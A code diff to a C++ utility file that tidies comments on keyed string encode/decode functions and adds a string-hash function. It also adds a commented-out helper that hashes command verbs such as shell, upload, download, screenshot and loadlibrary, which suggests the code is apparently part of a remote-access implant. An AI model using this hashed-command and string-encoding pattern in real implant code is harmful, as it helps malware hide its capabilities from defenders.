@@ -1,6 +1,6 @@
 #include "util.h"
 
-//Encodes string using key
+// Encodes string using key
 std::string encode(std::string key, std::string clear) {
 	std::string enc = "";
 	char key_c;
@@ -16,8 +16,8 @@ std::string encode(std::string key, std::string clear) {
 	return enc;
 }
 
-
-//Decodes string using key
+ 
+// Decodes string using key
 std::string decode(std::string key, std::string enc) {
 	std::string dec = "";
 	char key_c;
@@ -32,3 +32,35 @@ std::string decode(std::string key, std::string enc) {
 	}
 	return dec;
 }
+
+// Returns a hash given a string using slightly modified Horner's rule
+// https://cseweb.ucsd.edu/~kube/cls/100/Lectures/lec16/lec16-16.html
+long stringhash(std::string key) {
+	long hashVal = 0;
+	for (int i = 0; i < key.length(); i++) {
+		hashVal = (hashVal << 4) + key[i];
+		long g = hashVal & 0xF0000000L;
+		if (g != 0) 
+			hashVal ^= g >> 24;
+		hashVal &= ~g;
+	}
+	return hashVal;
+}
+
+/*
+	ALWAYS LEAVE OUT OF FINAL BUILD
+	Used to generate hashes for each of the action verbs
+*/
+/*
+void generatehashes() {
+	printf("%d\n", stringhash("ok"));
+	printf("%d\n", stringhash("info"));
+	printf("%d\n", stringhash("ps"));
+	printf("%d\n", stringhash("shell"));
+	printf("%d\n", stringhash("upload"));
+	printf("%d\n", stringhash("download"));
+	printf("%d\n", stringhash("kill"));
+	printf("%d\n", stringhash("screenshot"));
+	printf("%d\n", stringhash("loadlibrary"));
+}
+*/
